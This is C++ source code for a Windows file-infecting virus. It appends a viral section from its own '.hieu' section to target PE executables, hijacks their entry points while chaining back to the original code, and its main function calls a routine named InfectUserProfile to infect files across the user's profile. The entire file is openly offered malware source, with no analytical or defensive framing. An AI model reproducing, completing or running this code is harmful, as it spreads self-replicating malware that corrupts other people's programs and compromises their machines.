#include "virus/virus.h"
#include "pe/pecpp.h"

#include <fstream>
#include <filesystem>
#include <vector>

#define OFFSET

int main();

std::vector<unsigned char> section_data_global;

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{
    DWORD virus_va_in_target;
    DWORD virus_ra_in_target;

    DWORD target_entry_point = GetEntryPoint(file_data);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data_global.data(), (DWORD)section_data_global.size(), data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;
    virus_ra_in_target = virus_section_in_target->PointerToRawData;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = *(DWORD *)&section_data_global[4]; 
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64;
        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + 
                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD));
    }
    else
    {
        DWORD image_base = GetImageBase32(file_data);
        DWORD entry_point_32bit =   *(DWORD *)&section_data_global[0]; 
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86;

        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD));
        
        PUCHAR modify_push_virus_function = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_PUSH_VIRUSFUNCTION_X86;

        *(DWORD*)(modify_push_virus_function) = image_base + virus_va_in_target + entry_point_32bit + 0x70;
    }

    *(DWORD*)new_file_size = (DWORD)file_size;
    return;
}


int main()
{    
	char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    std::string current_file = buf;

    pe::PortableExecutable exe(current_file);
    section_data_global = exe.GetSectionData(".hieu").data;

    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddresses(&data);
    InfectUserProfile(&data);
    return 0;
}